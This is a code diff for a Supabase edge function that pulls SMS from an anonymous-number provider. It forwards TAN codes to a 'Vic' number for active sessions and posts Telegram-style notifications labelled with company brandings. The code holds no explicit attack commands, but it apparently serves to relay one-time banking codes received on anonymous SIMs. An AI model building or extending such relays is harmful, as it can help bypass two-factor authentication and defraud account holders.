@@ -1,4 +1,12 @@
+import { createClient } from "npm:@supabase/supabase-js@2";
 import { forwardByPhoneIdentifier } from "../_shared/forwardTan.ts";
+import { notifyIncomingSms } from "../_shared/notifyIncomingSms.ts";
+
+const supabase = createClient(
+  Deno.env.get("SUPABASE_URL")!,
+  Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!,
+  { auth: { persistSession: false } },
+);
 
 const corsHeaders = {
   "Access-Control-Allow-Origin": "*",
@@ -31,27 +39,57 @@ Deno.serve(async (req) => {
     const res = await fetch(url);
     const data = await res.json();
 
+    const smsList = Array.isArray(data?.sms) ? data.sms : [];
+    const messages = smsList.map((m: any) => ({
+      sender: m?.messageSender ?? m?.sender ?? "Unbekannt",
+      date: m?.messageDate ?? m?.date ?? new Date().toISOString(),
+      text: m?.messageText ?? m?.text ?? "",
+    }));
+    const apiIdentifier = storedIdentifier.replace("/share/orderbooking?", "/api/v1/orderbookingshare?");
+
     // TAN-Weiterleitung an die Vic-Nummer (nur aktive Sessions, idempotent)
-    try {
-      const smsList = Array.isArray(data?.sms) ? data.sms : [];
-      if (smsList.length > 0) {
-        const messages = smsList.map((m: any) => ({
-          sender: m?.messageSender ?? m?.sender ?? "Unbekannt",
-          date: m?.messageDate ?? m?.date ?? new Date().toISOString(),
-          text: m?.messageText ?? m?.text ?? "",
-        }));
-        // Try both the stored and the converted identifier — sessions may
-        // hold either form.
-        const apiIdentifier = storedIdentifier.replace("/share/orderbooking?", "/api/v1/orderbookingshare?");
-        await forwardByPhoneIdentifier(storedIdentifier, messages)
-          .then(async (r) => {
-            if (r.checked === 0 && r.reason === "no_active_session" && apiIdentifier !== storedIdentifier) {
-              await forwardByPhoneIdentifier(apiIdentifier, messages);
-            }
-          });
+    if (messages.length > 0) {
+      try {
+        const r = await forwardByPhoneIdentifier(storedIdentifier, messages);
+        if (r.checked === 0 && r.reason === "no_active_session" && apiIdentifier !== storedIdentifier) {
+          await forwardByPhoneIdentifier(apiIdentifier, messages);
+        }
+      } catch (e) {
+        console.error("forwardByPhoneIdentifier failed:", e);
       }
-    } catch (e) {
-      console.error("forwardByPhoneIdentifier failed:", e);
+
+      // Telegram "Neue SMS empfangen" — direkt beim Abruf, ohne Wächter
+      try {
+        const phoneNumber: string = data?.number ?? "";
+        // Branding + Name aus phone_numbers ermitteln (beide URL-Formen prüfen)
+        const { data: pn } = await supabase
+          .from("phone_numbers")
+          .select("branding_id")
+          .in("api_url", [storedIdentifier, apiIdentifier])
+          .limit(1)
+          .maybeSingle();
+        let brandingId: string | null = (pn?.branding_id as string) ?? null;
+        let brandingName: string | null = null;
+        if (brandingId) {
+          const { data: b } = await supabase
+            .from("brandings")
+            .select("company_name")
+            .eq("id", brandingId)
+            .maybeSingle();
+          brandingName = (b?.company_name as string) ?? null;
+        }
+        await notifyIncomingSms({
+          provider: "anosim",
+          sourceKey: apiIdentifier,
+          identifier: apiIdentifier,
+          phoneNumber,
+          brandingId,
+          brandingName,
+          messages,
+        });
+      } catch (e) {
+        console.error("notifyIncomingSms (anosim) failed:", e);
+      }
     }
 
     return new Response(JSON.stringify(data), {
